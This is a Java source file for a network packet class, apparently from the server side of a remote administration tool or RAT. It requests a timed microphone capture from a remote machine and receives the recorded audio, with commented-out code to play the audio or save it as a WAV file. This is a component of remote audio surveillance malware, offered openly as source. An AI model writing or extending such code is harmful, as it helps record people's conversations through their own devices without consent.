/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import com.ctx.server.ui.impl.RemoteMicrophoneUI;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import java.io.ByteArrayInputStream;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import lombok.Getter;
import lombok.Setter;

public class RemoteMicrophonePacket implements Packet 
{
    @Setter
    private static boolean isCanceled;
    
    private final float sampleRate = 16000.0F;
    private final int sampleSizeBits = 16;
    private final int channels = 1;
    private final boolean signed = true;
    private final boolean bigEndian = false;
    
    @Getter
    private static AudioInputStream audioInputStream;

    private final AudioFormat audioFormat = new AudioFormat(sampleRate, sampleSizeBits, channels, signed, bigEndian);
    
    @Setter
    private static int captureTime = 1;
    
    @Override
    public int getOpcode() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getDescription();
    }

    @Override
    public PacketType getPacketType() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getPacketType();
    }

    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) throws Exception 
    {
        int length = in.readableBytes();
        System.out.println("xd");
        byte[] data = new byte[length];
        in.readBytes(data, 0, length);
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        audioInputStream = new AudioInputStream(bais, audioFormat, data.length / audioFormat.getFrameSize());
        RemoteMicrophoneUI.getStatusLabel().setText("Status: capture finished: " + data.length);
        
        //Clip clip = AudioSystem.getClip();
        //clip.open(audioInputStream);
        //clip.start();
        
        /*if (audioInputStream != null && !clip.isActive()) 
        {
        clip.open(audioInputStream);
        clip.start();
        }*/
        //clip.close();
        // Save if fileName is not null
        //if (client.getFileName() != null && client.getFileName().contains(".wav"))
        //{
        // AudioSystem.write(audioInputStream, AudioFileFormat.Type.WAVE, new File(Constants.dataDir + Constants.seperator + client.getFileName()));
        //log.info("Saved audio file: {} size: {} bytes", new Object[]{client.getFileName(), data.length});
        //return;
        //}
    }

    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) throws Exception 
    {
        out.writeInt(captureTime);
    }
    
}
